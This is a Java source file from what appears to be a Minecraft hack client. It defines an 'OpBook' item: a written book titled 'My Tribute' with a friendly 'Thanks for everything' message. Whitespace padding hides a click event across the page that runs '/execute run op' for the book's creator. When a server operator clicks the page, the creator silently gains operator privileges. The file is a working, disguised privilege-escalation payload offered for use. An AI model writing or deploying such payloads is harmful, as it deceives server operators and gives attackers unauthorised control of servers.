package net.como.client.items.string;

import net.como.client.ComoClient;
import net.como.client.structures.StringCreativeItem;
import net.minecraft.item.Item;
import net.minecraft.item.Items;

public class OpBook implements StringCreativeItem {
    public OpBook() {
        super();
    }

    @Override
    public String getNbtString() {
        String name = ComoClient.me().getName().asString();
        return "{author:\""+name+"\",pages:['{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/execute run op "+name+"\"},\"text\":\"Thanks for everything.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \"}','{\"text\":\"\"}','{\"text\":\"\"}'],resolved:1b,title:\"My Tribute\"}";
    }

    @Override
    public Item getItem() {
        return Items.WRITTEN_BOOK;
    }
}
